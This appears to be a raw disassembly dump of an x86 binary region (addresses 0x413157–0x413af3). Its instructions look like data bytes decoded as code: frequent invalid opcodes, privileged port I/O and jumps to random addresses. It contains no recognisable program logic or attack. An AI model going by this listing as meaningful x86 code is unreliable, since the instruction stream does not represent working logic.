  413157:	mov    bl,0xb4
  413159:	std    
  41315a:	(bad)  
  41315b:	in     al,dx
  41315c:	test   al,0x9
  41315e:	in     eax,0xed
  413160:	mov    ds:0x6a9644b0,al
  413165:	shl    DWORD PTR [esp+ebp*2],1
  413168:	aas    
  413169:	adc    BYTE PTR [ebx],bh
  41316b:	fs or  ebp,edi
  41316e:	push   0xffffff9a
  413170:	call   FWORD PTR [ecx]
  413172:	test   al,0x13
  413174:	retf   
  413175:	mov    eax,0x91493116
  41317a:	stc    
  41317b:	fild   WORD PTR [ebx]
  41317d:	aad    0x55
  41317f:	leave  
  413180:	(bad)  
  413181:	xchg   ebx,eax
  413182:	(bad)  
  413183:	mov    bh,0x58
  413185:	push   cs
  413186:	es (bad) 
  413188:	cmp    BYTE PTR ds:0xa8e4c4e6,bh
  41318e:	sbb    al,BYTE PTR [edx-0x5a]
  413191:	or     BYTE PTR [ebx],0x8e
  413194:	les    ecx,FWORD PTR [ebx-0x6d]
  413197:	jecxz  0x41320b
  413199:	cmp    dl,BYTE PTR es:[ebx-0x31a4a6b]
  4131a0:	mov    dl,0xc5
  4131a2:	push   edi
  4131a3:	push   ss
  4131a4:	jbe    0x41316d
  4131a6:	push   es
  4131a7:	int3   
  4131a8:	leave  
  4131a9:	mov    al,0xec
  4131ab:	lock popf 
  4131ad:	in     eax,dx
  4131ae:	(bad)  
  4131af:	jmp    0x18225e59
  4131b4:	xor    edi,DWORD PTR [edi]
  4131b6:	call   0x98de:0x779b3c86
  4131bd:	(bad)  
  4131be:	imul   ecx
  4131c0:	mov    esi,0xdbadb21b
  4131c5:	dec    esp
  4131c6:	mov    fs:0x84218116,al
  4131cc:	out    dx,eax
  4131cd:	les    ebx,FWORD PTR [edx-0x5c]
  4131d0:	loop   0x413160
  4131d2:	inc    eax
  4131d3:	jne    0x413197
  4131d5:	(bad)  
  4131d6:	lahf   
  4131d7:	push   ss
  4131d8:	out    dx,eax
  4131d9:	stos   BYTE PTR es:[edi],al
  4131da:	jmp    0x1b24e913
  4131df:	out    0x11,al
  4131e1:	add    BYTE PTR [ebx],ah
  4131e3:	pop    ebx
  4131e4:	rcr    BYTE PTR [edi],cl
  4131e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4131e7:	jg     0x4131d6
  4131e9:	sub    eax,0x26fb912c
  4131ee:	test   edx,edi
  4131f0:	mov    al,0xd7
  4131f2:	pushf  
  4131f3:	addr16 inc eax
  4131f5:	gs sbb dl,dl
  4131f8:	xor    esp,eax
  4131fa:	add    dl,BYTE PTR [edi-0x56]
  4131fd:	sub    DWORD PTR [eax],ecx
  4131ff:	jecxz  0x4131db
  413201:	jge    0x41318e
  413203:	mov    eax,ds:0x91fd3038
  413208:	cmp    bl,0x53
  41320b:	cmp    esi,ebp
  41320d:	aas    
  41320e:	(bad)  
  41320f:	rcr    bh,cl
  413211:	lock lds edx,FWORD PTR [ecx-0x1e]
  413215:	sbb    eax,0x64db4f3a
  41321a:	les    eax,FWORD PTR [ecx]
  41321c:	in     al,dx
  41321d:	inc    esi
  41321e:	push   edi
  41321f:	(bad)
  413222:	adc    DWORD PTR [ecx-0x4e],ebx
  413225:	pop    es
  413226:	sbb    DWORD PTR [edx+eax*1+0x6b38c405],edx
  41322d:	mov    ch,0x3a
  41322f:	add    al,0xdc
  413231:	jbe    0x4132b1
  413233:	scas   eax,DWORD PTR es:[edi]
  413234:	(bad)  
  413236:	mov    cl,0x5b
  413238:	xchg   BYTE PTR [edi],al
  41323a:	jmp    0x6bcb82e0
  41323f:	dec    eax
  413240:	call   DWORD PTR [edi]
  413242:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413243:	outs   dx,DWORD PTR ds:[esi]
  413244:	mov    cl,0x94
  413246:	loop   0x4132bd
  413248:	popa   
  413249:	sub    BYTE PTR [ebx],ch
  41324b:	dec    ebx
  41324c:	push   ebx
  41324d:	push   ecx
  41324e:	addr16 inc esp
  413250:	mov    dl,cl
  413252:	cdq    
  413253:	adc    edi,DWORD PTR [ebp+0x10]
  413256:	fwait
  413257:	push   ds
  413258:	push   0x19216cad
  41325d:	inc    ebp
  41325e:	les    ebx,FWORD PTR ds:[edx]
  413261:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413262:	push   ecx
  413263:	dec    edi
  413264:	sbb    eax,0xa124b188
  413269:	dec    edi
  41326a:	retf   
  41326b:	xor    DWORD PTR [edx+0x35],esp
  41326e:	outs   dx,BYTE PTR ds:[esi]
  41326f:	mov    dh,0x5b
  413271:	mov    eax,ds:0x6445443d
  413276:	xchg   ecx,eax
  413277:	fbstp  TBYTE PTR [esi+0x16]
  41327a:	das    
  41327b:	cmp    ah,ch
  41327d:	(bad)  [ebx+0x56]
  413280:	xor    eax,0xcec957d
  413285:	out    dx,eax
  413286:	mov    al,0x97
  413288:	int3   
  413289:	in     eax,dx
  41328a:	jb     0x4132a1
  41328c:	fs jl  0x413229
  41328f:	adc    bh,BYTE PTR [edx-0x46]
  413292:	xchg   esp,eax
  413293:	cmp    DWORD PTR [esi-0x48],ebp
  413296:	mov    ch,0xe7
  413298:	xor    BYTE PTR [ecx+0x65956e74],0x2c
  41329f:	inc    edx
  4132a0:	fistp  QWORD PTR [ebp+0x74]
  4132a3:	jmp    0x41331e
  4132a5:	and    DWORD PTR [edx],edx
  4132a7:	rcr    DWORD PTR [ebx],cl
  4132a9:	dec    ecx
  4132aa:	cli    
  4132ab:	cmp    BYTE PTR ds:0xcfba300c,dl
  4132b1:	cmp    al,0x3
  4132b3:	mov    ch,0x7a
  4132b5:	ja     0x4132c2
  4132b7:	outs   dx,BYTE PTR ds:[esi]
  4132b8:	mov    bh,0x30
  4132ba:	jmp    0xaf32cdf7
  4132bf:	daa    
  4132c0:	pop    ecx
  4132c1:	loopne 0x413307
  4132c3:	fcmove st,st(7)
  4132c5:	dec    edi
  4132c6:	cmovnp edx,DWORD PTR [ebx-0x170ae1c0]
  4132cd:	sbb    edx,DWORD PTR [ebx+0x6c325eea]
  4132d3:	aad    0x3b
  4132d5:	or     al,0x8
  4132d7:	ds push ecx
  4132d9:	fldenv ds:0xdc2af38b
  4132df:	pop    eax
  4132e0:	int3   
  4132e1:	jge    0x4132aa
  4132e3:	push   esi
  4132e4:	mov    ecx,0x275cd4ed
  4132e9:	sub    edi,ebx
  4132eb:	xor    DWORD PTR [edi-0x5ebcd25e],ebx
  4132f1:	inc    esp
  4132f2:	pavgw  mm4,QWORD PTR [ebx]
  4132f5:	jae    0x4132a5
  4132f7:	mov    ebp,0xc5aec21b
  4132fc:	inc    esp
  4132fd:	or     eax,0x8eba94fb
  413302:	xchg   edi,eax
  413303:	or     BYTE PTR [esi-0x1566c107],bh
  413309:	push   edx
  41330a:	push   edx
  41330b:	sbb    ebx,DWORD PTR [edi-0x5e]
  41330e:	dec    ecx
  41330f:	call   0x3b7469fc
  413314:	bound  esi,QWORD PTR [edi+0xda7aa24]
  41331a:	dec    ebp
  41331b:	fdivr  QWORD PTR [ebx-0x22]
  41331e:	loop   0x41339a
  413320:	add    edx,esi
  413322:	push   0xdab380bc
  413327:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413328:	daa    
  413329:	sbb    esi,DWORD PTR [ebx+0x106bbf1]
  41332f:	test   dl,ah
  413331:	or     BYTE PTR [edx-0x503a8680],cl
  413337:	in     al,dx
  413338:	lods   al,BYTE PTR ds:[esi]
  413339:	in     eax,dx
  41333a:	mov    al,ds:0xb43bb130
  41333f:	loope  0x41331f
  413341:	mov    edi,0x37a37cd2
  413346:	ds fwait
  413348:	cmp    DWORD PTR [esi-0x26773655],ebx
  41334e:	push   esi
  41334f:	and    eax,0xb4d48fd6
  413354:	cld    
  413355:	xchg   ebp,eax
  413356:	mov    al,ds:0x7bd52691
  41335b:	imul   ebx,DWORD PTR [edi+esi*2-0x8],0x3bd14448
  413363:	jp     0x4133c5
  413365:	test   ecx,eax
  413367:	in     eax,dx
  413368:	xor    al,bl
  41336a:	(bad)  [edx]
  41336c:	pusha  
  41336d:	imul   esp,DWORD PTR [edx-0x53c82c8c],0xffffffcb
  413374:	aas    
  413375:	sbb    ebx,DWORD PTR [edi-0x70]
  413378:	cmp    ch,ah
  41337a:	ss fs mov eax,0x2cfbe7d7
  413381:	aas    
  413382:	popa   
  413383:	nop
  413384:	push   eax
  413385:	ss stc 
  413387:	sub    edi,DWORD PTR [ecx-0x3b]
  41338a:	inc    esp
  41338b:	or     esi,DWORD PTR [eax-0x42]
  41338e:	inc    BYTE PTR [eax]
  413390:	mov    edx,0x8f9a730c
  413395:	in     eax,dx
  413396:	pop    ebx
  413397:	sub    eax,0xc6add1bf
  41339c:	cmp    al,BYTE PTR [edi]
  41339e:	jns    0x413418
  4133a0:	out    dx,al
  4133a1:	retf   0x80a5
  4133a4:	push   ss
  4133a5:	push   0x6f
  4133a7:	leave  
  4133a8:	adc    al,0xe
  4133aa:	fwait
  4133ab:	stc    
  4133ac:	pop    ebx
  4133ad:	lds    esi,FWORD PTR [eax+0x40cb7041]
  4133b3:	enter  0x30e0,0x7d
  4133b7:	jo     0x413409
  4133b9:	adc    DWORD PTR [esi+0xf467242],ebx
  4133bf:	add    dh,BYTE PTR [ebp+0x5225129d]
  4133c5:	xor    eax,0x7c2bb85c
  4133ca:	ins    DWORD PTR es:[edi],dx
  4133cb:	ss idiv esp
  4133ce:	and    BYTE PTR [ecx],bh
  4133d0:	mov    eax,0xd5dd7c6
  4133d5:	ret    0x19ad
  4133d8:	inc    edx
  4133d9:	ins    BYTE PTR es:[edi],dx
  4133da:	mov    bl,0xf7
  4133dc:	jne    0x4133a1
  4133de:	or     eax,0x5fd5848d
  4133e3:	xchg   bh,cl
  4133e5:	mov    ds:0x256830a3,al
  4133ea:	xchg   edx,eax
  4133eb:	hlt    
  4133ec:	push   es
  4133ed:	(bad)  
  4133ee:	dec    ecx
  4133ef:	test   DWORD PTR [esi+0x6c],0xc9439cfd
  4133f6:	xor    ebx,eax
  4133f8:	cmp    al,0x69
  4133fa:	fadd   DWORD PTR [eax]
  4133fc:	gs push esp
  4133fe:	daa    
  4133ff:	sbb    BYTE PTR [edi],dh
  413401:	scas   al,BYTE PTR es:[edi]
  413402:	test   DWORD PTR ds:0x24a0ad3b,edx
  413408:	ret    0x3eae
  41340b:	xchg   edx,eax
  41340c:	sbb    DWORD PTR [esi],edi
  41340e:	mov    bh,dh
  413410:	in     al,0x74
  413412:	mov    al,ds:0xb17eac21
  413417:	adc    edx,ebx
  413419:	lods   eax,DWORD PTR ds:[esi]
  41341a:	add    BYTE PTR [eax-0x272b7825],ah
  413420:	fmulp  st(4),st
  413422:	sub    BYTE PTR [esi+0x5b10c7cf],0x2d
  413429:	sbb    bh,BYTE PTR gs:[edx+0xf75096b]
  413430:	rol    BYTE PTR [edi+0x4c51545e],cl
  413436:	call   0x1105a571
  41343b:	int    0xb8
  41343d:	adc    al,0x34
  41343f:	stos   DWORD PTR es:[edi],eax
  413440:	sub    cl,ch
  413442:	in     eax,0x5a
  413444:	ret    0xeaac
  413447:	mov    dl,0x77
  413449:	add    cl,dl
  41344b:	cmp    BYTE PTR ds:0xce11c465,cl
  413451:	jle    0x413407
  413453:	ss stos BYTE PTR es:[di],al
  413456:	xchg   eax,esp
  413458:	out    dx,eax
  413459:	test   ebx,ebx
  41345b:	mov    dl,0x74
  41345d:	xor    al,0xf3
  41345f:	xchg   BYTE PTR [ebx+0x3316fa97],bl
  413465:	mov    bh,0x71
  413467:	stos   BYTE PTR es:[edi],al
  413468:	add    esi,DWORD PTR es:[edi+0x5e]
  41346c:	jge    0x4134b3
  41346e:	adc    eax,0x7ebd8c56
  413473:	jns    0x41344d
  413475:	and    dh,BYTE PTR [ebp+0x1d]
  413478:	sbb    edi,esp
  41347a:	out    dx,eax
  41347b:	(bad)  
  41347c:	jle    0x4134a8
  41347e:	ficom  DWORD PTR [edx]
  413480:	neg    DWORD PTR [eax-0xa]
  413483:	out    0xf0,al
  413485:	sbb    BYTE PTR [ebx+0x1a],0x32
  413489:	adc    edx,DWORD PTR [eax+0x1905be06]
  41348f:	pop    es
  413490:	leave  
  413491:	xor    eax,0x3785ad85
  413496:	inc    esi
  413497:	and    DWORD PTR [edi],ecx
  413499:	xchg   esp,eax
  41349a:	out    dx,eax
  41349b:	jnp    0x41349a
  41349d:	mov    bl,0xad
  41349f:	sar    BYTE PTR [esi],cl
  4134a1:	aas    
  4134a2:	mov    WORD PTR [esi-0xf],gs
  4134a5:	push   es
  4134a6:	sar    BYTE PTR [ebp+0x1fbcb4cc],1
  4134ac:	xchg   DWORD PTR [eax-0x5f],edx
  4134af:	mov    ebx,0x2148326
  4134b4:	out    0x70,al
  4134b6:	mov    esp,0xd1954473
  4134bb:	fistp  WORD PTR [ebp-0x6d]
  4134be:	push   esi
  4134bf:	fwait
  4134c0:	adc    eax,0x2b6de5f8
  4134c5:	pop    edx
  4134c6:	sbb    BYTE PTR [eax],dl
  4134c8:	adc    DWORD PTR [ebp+0x50bc87a8],ebp
  4134ce:	addr16 in eax,dx
  4134d0:	(bad)  
  4134d1:	xor    al,0xeb
  4134d3:	mov    esi,0x19857087
  4134d8:	and    dh,BYTE PTR [esi]
  4134da:	loop   0x4134eb
  4134dc:	cs dec esi
  4134de:	outs   dx,BYTE PTR ds:[esi]
  4134df:	fdiv   DWORD PTR [eax]
  4134e1:	xor    al,0x86
  4134e3:	mov    ecx,ebx
  4134e5:	jb     0x413524
  4134e7:	mov    edi,0x361362a5
  4134ec:	mov    ch,0x1c
  4134ee:	jle    0x4134fb
  4134f0:	pop    es
  4134f1:	outs   dx,DWORD PTR ds:[esi]
  4134f2:	push   ss
  4134f3:	sbb    DWORD PTR [edx],esp
  4134f5:	mov    edx,esi
  4134f7:	dec    esi
  4134f8:	push   es
  4134f9:	ins    BYTE PTR es:[edi],dx
  4134fa:	rcl    DWORD PTR [esp+ecx*4-0x1b],cl
  4134fe:	clc    
  4134ff:	push   ebp
  413500:	repz xor ecx,DWORD PTR [edi+ecx*1+0x409bc811]
  413508:	xchg   edi,eax
  413509:	les    ebx,FWORD PTR [eax+0x180cd8d6]
  41350f:	inc    DWORD PTR [eax-0x4c]
  413512:	and    eax,0x270884ef
  413517:	jnp    0x413585
  413519:	push   edi
  41351a:	inc    esp
  41351b:	mov    DWORD PTR [ebp+0x6ccf94be],ecx
  413521:	mov    ebx,DWORD PTR [ebx]
  413523:	fistp  WORD PTR [edi]
  413525:	jl     0x41350e
  413527:	ret    
  413528:	pop    eax
  413529:	cmp    dh,BYTE PTR [eax]
  41352b:	int3   
  41352c:	scas   eax,DWORD PTR es:[edi]
  41352d:	xor    dh,0x14
  413530:	scas   al,BYTE PTR es:[edi]
  413531:	xchg   edi,eax
  413532:	lock outs dx,DWORD PTR ds:[esi]
  413534:	add    eax,0xb043230b
  413539:	xchg   ebx,eax
  41353a:	push   ecx
  41353b:	xchg   BYTE PTR [edi+0x407a2c8e],dl
  413541:	ins    DWORD PTR es:[edi],dx
  413542:	cmp    DWORD PTR [edx+0x35],ebp
  413545:	loopne 0x41357b
  413547:	push   ecx
  413548:	jle    0x413565
  41354a:	and    DWORD PTR ds:0x15976981,esp
  413550:	adc    al,0x96
  413552:	sub    al,dh
  413554:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413555:	fbld   TBYTE PTR [eax-0x539023ef]
  41355b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41355c:	jecxz  0x413559
  41355e:	xchg   ebx,eax
  41355f:	sub    BYTE PTR [esi-0x154706dc],cl
  413565:	mov    ecx,DWORD PTR [ecx-0xb]
  413568:	test   BYTE PTR [eax+0x36],bl
  41356b:	inc    edx
  41356c:	cmp    ch,BYTE PTR [ebx-0x231897]
  413572:	jle    0x4135bd
  413574:	jno    0x4135d8
  413576:	das    
  413577:	stos   DWORD PTR es:[edi],eax
  413578:	xchg   ebx,eax
  413579:	pop    edx
  41357a:	xor    ecx,edx
  41357c:	shl    dl,0xb7
  41357f:	aaa    
  413580:	dec    ebp
  413581:	xchg   ebp,eax
  413582:	pusha  
  413583:	or     ah,bl
  413585:	inc    eax
  413586:	mov    WORD PTR [ebp+0x1a1c0195],es
  41358c:	pop    es
  41358d:	sbb    BYTE PTR ds:0x80f7e7ee,0x87
  413594:	loope  0x41354f
  413596:	sbb    edx,DWORD PTR [eax]
	...
  413768:	call   0x7fb79f3d
  41376d:	idiv   ecx
  41376f:	ficom  WORD PTR [ebp+0x2e]
  413772:	inc    esp
  413773:	and    al,0xf9
  413775:	cld    
  413776:	ftst   
  413778:	sub    DWORD PTR [eax+0x1],esi
  41377b:	add    BYTE PTR [edx],ah
  41377d:	pop    es
  41377e:	add    BYTE PTR [eax],al
  413780:	dec    ecx
  413781:	lods   al,BYTE PTR ds:[esi]
  413782:	adc    cl,bh
  413784:	shr    cl,cl
  413786:	inc    ebp
  413787:	icebp  
  413788:	mov    al,0x7a
  41378a:	fld    DWORD PTR [esi]
  41378c:	adc    DWORD PTR [ecx+0x30ba6edb],0xd
  413793:	not    BYTE PTR [ebp+0x76]
  413796:	lea    eax,[edx+0x3396a61a]
  41379c:	push   eax
  41379d:	pop    esi
  41379e:	xchg   esi,eax
  41379f:	jecxz  0x4137c5
  4137a1:	sbb    al,0xd6
  4137a3:	fiadd  DWORD PTR [esi+0x26d1ea0a]
  4137a9:	push   esi
  4137aa:	jge    0x413829
  4137ac:	lea    esi,[ebx]
  4137ae:	cmp    eax,0xd393ce9d
  4137b3:	adc    eax,0x81d27eb6
  4137b8:	stos   DWORD PTR es:[edi],eax
  4137b9:	mov    WORD PTR [esi-0x6c],ds
  4137bc:	popf   
  4137bd:	cmp    al,0xf1
  4137bf:	outs   dx,DWORD PTR ds:[esi]
  4137c0:	icebp  
  4137c1:	jns    0x413774
  4137c3:	(bad)  
  4137c4:	or     eax,0xcaa29a4a
  4137c9:	mov    esp,0xf17d5a62
  4137ce:	jmp    0x413816
  4137d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4137d1:	xlat   BYTE PTR ds:[ebx]
  4137d2:	addr16 ret 0x68
  4137d6:	aam    0x67
  4137d8:	push   ecx
  4137d9:	jecxz  0x413811
  4137db:	cmp    eax,0xb78011bc
  4137e0:	sub    eax,0x4498f5ac
  4137e5:	mov    esi,0x3891a9d2
  4137ea:	das    
  4137eb:	ins    DWORD PTR es:[edi],dx
  4137ec:	jno    0x41378f
  4137ee:	sbb    eax,0xffffffbf
  4137f1:	leave  
  4137f2:	jp     0x413865
  4137f4:	and    ebx,DWORD PTR ds:0x7153
  4137f9:	popa   
  4137fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4137fb:	push   esp
  4137fc:	cs jo  0x4137b5
  4137ff:	mov    ebx,0x8961f307
  413804:	or     dl,BYTE PTR [ebx-0x7f6c5e13]
  41380a:	clc    
  41380b:	ficom  WORD PTR [edi+0x66005777]
  413811:	and    al,0x12
  413813:	cmp    BYTE PTR [edx],dl
  413815:	(bad)  
  413816:	int    0x44
  413818:	mov    ch,0x35
  41381a:	in     al,0x4f
  41381c:	shl    BYTE PTR [eax-0x3c],0x88
  413820:	mov    al,0x6f
  413822:	jle    0x41381b
  413824:	mov    BYTE PTR [ebx-0x79],al
  413827:	iret   
  413828:	sub    BYTE PTR [edx+ebp*4+0x3e],ch
  41382c:	xchg   esi,eax
  41382d:	cs xor eax,0xcb05bbd2
  413833:	bound  esi,QWORD PTR [edi]
  413835:	inc    edx
  413836:	ret    
  413837:	xor    al,0xff
  413839:	out    dx,eax
  41383a:	mov    eax,ds:0xcdb2a32d
  41383f:	sub    DWORD PTR [edi*4+0x1fc07459],esi
  413846:	inc    esi
  413847:	loop   0x413812
  413849:	das    
  41384a:	in     al,0xb4
  41384c:	xor    BYTE PTR [edx-0x33],ch
  41384f:	fild   WORD PTR [esi+ecx*4-0x4b]
  413853:	jge    0x4138d2
  413855:	mov    ebp,0xcdd12f68
  41385a:	or     ecx,DWORD PTR [edi-0x60]
  41385d:	inc    ebx
  41385e:	test   BYTE PTR [eax+0x19],cl
  413861:	and    BYTE PTR [esi],dl
  413863:	mov    cl,cl
  413865:	mov    al,ds:0xc12b9b66
  41386a:	cs cld 
  41386c:	sbb    eax,0x4dc69160
  413871:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413872:	sub    BYTE PTR [ebx+edi*8-0x65e93cdc],al
  413879:	jno    0x413828
  41387b:	jbe    0x413847
  41387d:	pop    edx
  41387e:	inc    ebx
  41387f:	sub    bl,BYTE PTR [edi-0x63]
  413882:	sub    edx,DWORD PTR [ebx-0x4b]
  413885:	mov    edx,0xa8867232
  41388a:	jno    0x4138f2
  41388c:	into   
  41388d:	mov    DWORD PTR [ebx+0x4bed66b3],ecx
  413893:	push   es
  413894:	pop    esi
  413895:	mov    bh,0xf3
  413897:	xchg   esi,eax
  413898:	popf   
  413899:	cmc    
  41389a:	cmp    ah,BYTE PTR [edi-0x3a]
  41389d:	jmp    0x4afb1001
  4138a2:	popa   
  4138a3:	imul   edi,DWORD PTR [eax],0xffffff84
  4138a6:	mov    al,0xb6
  4138a8:	arpl   ax,dx
  4138aa:	mov    dh,BYTE PTR [esi+0x5d1cefb1]
  4138b0:	mov    edx,DWORD PTR [esi+0x16]
  4138b3:	add    al,0x68
  4138b5:	shr    BYTE PTR gs:[edi+0x65cee58a],cl
  4138bc:	cmp    BYTE PTR [ecx],bl
  4138be:	sbb    al,0x8b
  4138c0:	in     al,0xa7
  4138c2:	repnz cmp BYTE PTR [ecx],cl
  4138c5:	or     edx,ebx
  4138c7:	inc    ebx
  4138c8:	pop    edx
  4138c9:	adc    eax,0xcb308aa9
  4138ce:	pop    edx
  4138cf:	and    cl,dl
  4138d1:	fild   DWORD PTR [ebx+0x7d382f1a]
  4138d7:	and    al,0x29
  4138d9:	loop   0x4138a2
  4138db:	hlt    
  4138dc:	cmp    ch,BYTE PTR [ecx]
  4138de:	add    esi,DWORD PTR fs:[edi-0x5e]
  4138e2:	or     ah,ch
  4138e4:	in     al,0xe3
  4138e6:	mov    eax,ds:0x4bd5f7f1
  4138eb:	mov    esi,0x7f9b0dea
  4138f0:	inc    esi
  4138f1:	ins    DWORD PTR es:[edi],dx
  4138f2:	add    DWORD PTR [ecx-0x16118c28],esp
  4138f8:	rcl    DWORD PTR [ebp+0xacec9f2],cl
  4138fe:	xor    bh,BYTE PTR [ecx+0x6f]
  413901:	mov    edx,0x247cb1e
  413906:	jne    0x413903
  413908:	lods   al,BYTE PTR ds:[esi]
  413909:	push   0xc049f42d
  41390e:	sahf   
  41390f:	adc    ch,cl
  413911:	sysexit 
  413913:	pop    esp
  413914:	cmc    
  413915:	mov    ebx,0xda445497
  41391a:	sbb    eax,0xcd30aa41
  41391f:	mov    bl,0x58
  413921:	or     edi,0xbd123d0c
  413927:	lock jne 0x4138b4
  41392a:	push   0x6a2af7b4
  41392f:	aad    0x6b
  413931:	mov    ebp,0xa2a3bbd6
  413936:	rol    al,0xb8
  413939:	dec    edi
  41393a:	xor    bh,al
  41393c:	xchg   esp,eax
  41393d:	push   0x8532e07a
  413942:	mov    bl,0xca
  413944:	adc    al,0x50
  413946:	pop    ebp
  413947:	and    BYTE PTR [ebp-0x776e4f02],ch
  41394d:	xor    eax,0x21f1867a
  413952:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413953:	dec    eax
  413954:	or     cl,BYTE PTR [eax]
  413956:	mov    WORD PTR [eax-0x5f],es
  413959:	in     eax,0x79
  41395b:	push   ss
  41395c:	jl     0x4139ba
  41395e:	jbe    0x413995
  413960:	push   ds
  413961:	pusha  
  413962:	jp     0x41392f
  413964:	mov    ds:0x912e5d2a,al
  413969:	dec    edi
  41396a:	mov    esp,0x857e90ee
  41396f:	add    sp,dx
  413972:	sub    eax,0x2214dbc1
  413977:	mov    DWORD PTR ds:0x5810d16a,esp
  41397d:	sub    ah,dl
  41397f:	xchg   DWORD PTR [esi-0x60bcdecb],ebp
  413985:	cld    
  413986:	push   ebp
  413987:	pop    es
  413988:	mov    edx,0x59f36d82
  41398d:	mov    DWORD PTR [edi+0xfc7c70a],ecx
  413993:	cmp    BYTE PTR [ebx+0x66c70063],ah
  413999:	xchg   ebp,eax
  41399a:	jns    0x413a09
  41399c:	push   ebx
  41399d:	popf   
  41399e:	ret    
  41399f:	sahf   
  4139a0:	mov    bh,0x4c
  4139a2:	xor    DWORD PTR [eax+0x56174e5f],edx
  4139a8:	mov    DWORD PTR [eax],esi
  4139aa:	push   ebx
  4139ab:	push   0xfc54b38f
  4139b0:	cmp    ah,dl
  4139b2:	sbb    bl,bl
  4139b4:	retf   
  4139b5:	fwait
  4139b6:	pop    ss
  4139b7:	mov    bh,0x7
  4139b9:	out    dx,eax
  4139ba:	dec    edi
  4139bb:	gs inc ecx
  4139bd:	dec    ebp
  4139be:	pop    ds
  4139bf:	pop    esp
  4139c0:	xor    cl,dl
  4139c2:	add    DWORD PTR ds:0x4b71de75,eax
  4139c8:	retf   
  4139c9:	je     0x413a38
  4139cb:	(bad)  
  4139cc:	leave  
  4139cd:	data16 xlat BYTE PTR ds:[ebx]
  4139cf:	inc    edx
  4139d0:	xor    DWORD PTR [ebp+0x7e1bf32a],esp
  4139d6:	xchg   ecx,eax
  4139d7:	xchg   ecx,eax
  4139d8:	aam    0x58
  4139da:	dec    ebx
  4139db:	push   esp
  4139dc:	les    edi,FWORD PTR [ebp-0x3f]
  4139df:	cmp    eax,0x9ee50c35
  4139e4:	ret    
  4139e5:	lea    edx,[ecx+0x1a]
  4139e8:	int    0x84
  4139ea:	jmp    0xc7325efd
  4139ef:	les    ecx,FWORD PTR [eax-0x21]
  4139f2:	mov    al,0x25
  4139f4:	stos   DWORD PTR es:[edi],eax
  4139f5:	mov    ds,WORD PTR [eax+eiz*1+0x667cbf60]
  4139fc:	sbb    BYTE PTR [edx+0x46],al
  4139ff:	xchg   esp,eax
  413a00:	sub    bh,al
  413a02:	cwde   
  413a03:	or     BYTE PTR [edx+0x72],0xbd
  413a07:	aad    0x7b
  413a09:	and    dh,BYTE PTR [ecx-0x25]
  413a0c:	int3   
  413a0d:	mov    bl,0x15
  413a0f:	dec    ebx
  413a10:	xchg   edx,eax
  413a11:	xchg   edi,eax
  413a12:	out    dx,eax
  413a13:	(bad)  [esi]
  413a15:	das    
  413a16:	xor    cl,BYTE PTR [eax-0x3d]
  413a19:	dec    ebx
  413a1a:	stos   BYTE PTR es:[edi],al
  413a1b:	inc    ecx
  413a1c:	jns    0x413a69
  413a1e:	xor    DWORD PTR [ebx+0x23d94efb],edi
  413a24:	in     eax,0xcb
  413a26:	imul   esi,ebx,0x98620f78
  413a2c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413a2d:	ins    BYTE PTR es:[edi],dx
  413a2e:	mov    ds:0x6e230859,eax
  413a33:	push   ds
  413a34:	or     eax,0x4446a7a3
  413a39:	sub    DWORD PTR [ecx+0x5ea50b56],edx
  413a3f:	retf   0x6ee6
  413a42:	(bad)
  413a45:	cs pop esp
  413a47:	inc    ebp
  413a48:	shl    DWORD PTR [edi-0x7e95bc26],1
  413a4e:	aas    
  413a4f:	in     eax,0x7a
  413a51:	test   eax,0x917dba87
  413a56:	adc    ecx,DWORD PTR [ecx-0x6b]
  413a59:	inc    ecx
  413a5a:	adc    dh,BYTE PTR [ebp-0x1ff3f6e9]
  413a60:	ret    
  413a61:	test   al,0xce
  413a63:	test   ecx,esi
  413a65:	fwait
  413a66:	loope  0x4139f6
  413a68:	xchg   edx,eax
  413a69:	push   0xffffff93
  413a6b:	inc    edi
  413a6c:	or     al,0xe7
  413a6e:	jmp    0x1d47f66f
  413a73:	push   edx
  413a74:	sti    
  413a75:	xchg   edx,eax
  413a76:	adc    edi,DWORD PTR ds:0xbaacc5f8
  413a7c:	mov    cs,ecx
  413a7e:	jge    0x413a83
  413a80:	inc    edx
  413a81:	adc    eax,0xd62940e1
  413a86:	mov    eax,ds:0xfc5d43d6
  413a8b:	cli    
  413a8c:	js     0x413a43
  413a8e:	call   0x43855268
  413a93:	xor    edi,DWORD PTR [ecx+0x39fb7047]
  413a99:	pop    esi
  413a9a:	nop
  413a9b:	ss addr16 cli 
  413a9e:	mov    cl,BYTE PTR [ebx-0x21]
  413aa1:	adc    ch,BYTE PTR [esi+0x79]
  413aa4:	loopne 0x413ab2
  413aa6:	retf   0x2891
  413aa9:	mov    dh,0xd6
  413aab:	push   0x52d477b0
  413ab0:	adc    al,0xde
  413ab2:	or     DWORD PTR [edi-0x35],edi
  413ab5:	in     al,dx
  413ab6:	ins    BYTE PTR es:[edi],dx
  413ab7:	loop   0x413b02
  413ab9:	rcr    DWORD PTR [ebp+ebp*8-0x39],0x77
  413abe:	fstp   QWORD PTR [edx+0x2b931610]
  413ac4:	dec    edx
  413ac5:	mov    ah,0xbd
  413ac7:	(bad)  
  413ac8:	or     DWORD PTR [ebx+eax*1-0x2e],ebx
  413acc:	push   esp
  413acd:	das    
  413ace:	daa    
  413acf:	jg     0x413ae0
  413ad1:	add    DWORD PTR [esi],ebx
  413ad3:	(bad)  
  413ad6:	in     eax,0x84
  413ad8:	xchg   BYTE PTR [edi-0x7c9fe16b],dl
  413ade:	test   eax,0x9c9e4dcb
  413ae3:	jae    0x413b46
  413ae5:	and    esi,edx
  413ae7:	mov    cl,0xdc
  413ae9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413aea:	xchg   BYTE PTR [eax+ebp*8],dh
  413aed:	push   esp
  413aee:	push   edi
  413aef:	xor    DWORD PTR [esi-0x53],0xffffffa5
  413af3:	cmp    ecx,DWORD PTR [edx]
